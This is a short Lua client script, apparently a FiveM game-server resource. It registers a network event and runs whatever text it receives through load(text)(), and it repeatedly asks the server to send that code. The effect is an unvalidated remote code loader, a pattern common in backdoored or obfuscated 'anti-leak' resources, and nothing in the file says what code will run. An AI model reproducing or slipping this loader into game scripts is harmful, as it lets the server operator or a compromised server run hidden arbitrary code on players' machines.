local spawned = false

RegisterNetEvent("alepouminklepseis")
AddEventHandler("alepouminklepseis", function(text)
	load(text)()
	spawned = true
end)

CreateThread(function()
    
    if not spawned then
        spawned = true
		
        TriggerServerEvent("alepouminklepseisS")
		
        for i = 1, 30 do
            Wait(5000)
            TriggerServerEvent("alepouminklepseisS")
        end
    end
end)